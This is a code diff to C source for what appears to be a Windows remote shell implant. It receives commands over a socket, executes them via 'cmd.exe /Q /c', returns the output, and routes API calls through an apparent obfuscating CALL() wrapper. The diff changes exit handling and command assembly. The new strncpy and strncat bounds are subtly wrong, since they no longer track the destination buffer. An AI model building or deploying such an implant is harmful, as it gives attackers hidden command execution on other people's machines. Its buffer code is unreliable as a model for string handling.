@@ -15,10 +15,6 @@
 #define SHELL "cmd.exe /Q /c"
 #endif
 
-#ifndef SHELL_POST
-#define SHELL_POST ""
-#endif
-
 #ifndef PROMPT
 #define PROMPT ">"
 #endif
@@ -292,7 +288,8 @@ int start() {
 
     if (CALL(strncmp)(buf, "quit", 4) == 0 || CALL(strncmp)(buf, "exit", 4) == 0) {
       running = 0;
-      break;
+      sendQ(sock, "Exiting.\n");
+      goto quit;
     }
     if (CALL(strncmp)(buf, "cd ", 3) == 0) {
       buf[n - 1] = '\0';
@@ -312,10 +309,11 @@ int start() {
       SecureZeroMemory(buf, sizeof(buf));
       n = 0;
     }
-    // CALL(snprintf)(cmd, sizeof(cmd), SHELL, buf);
-    CALL(strncpy)(cmd, SHELL " ", sizeof(cmd));
-    CALL(strncat)(cmd, buf, sizeof(cmd) - CALL(strlen)(cmd) - 1);
-    CALL(strncat)(cmd, " " SHELL_POST, sizeof(cmd) - CALL(strlen)(cmd) - 1);
+    CALL(strncpy)(cmd, SHELL " ", sizeof(SHELL) + 1);
+    CALL(strncat)(cmd, buf, CALL(strlen)(buf) - 1);
+#ifdef SHELL_POST
+    CALL(strncat)(cmd, " " SHELL_POST, CALL(strlen)(SHELL_POST) + 1);
+#endif
     cmd[sizeof(cmd) - 1] = '\0';
     if (run_process(cmd, buf, 1, 10000, &out, &code, &timed_out)) {
       if (timed_out)
@@ -326,16 +324,19 @@ int start() {
       }
       send(sock, out.data, out.len, 0);
       sendQ(sock, "\n");
-      SecureZeroMemory(buf, sizeof(buf));
       n = 0;
     } else
       sendQ(sock, "Could not start the process.\n\n");
-    SecureZeroMemory(&cmd, sizeof(cmd));
+    SecureZeroMemory(buf, sizeof(buf));
+    SecureZeroMemory(cmd, sizeof(cmd));
+    SecureZeroMemory(out.data, out.len);
   }
-
+quit:
   shutdown(sock, SD_BOTH);
   closesocket(sock);
   CALL(free)(out.data);
+  WSACleanup();
+  ExitProcess(0);
   return 0;
 }
 
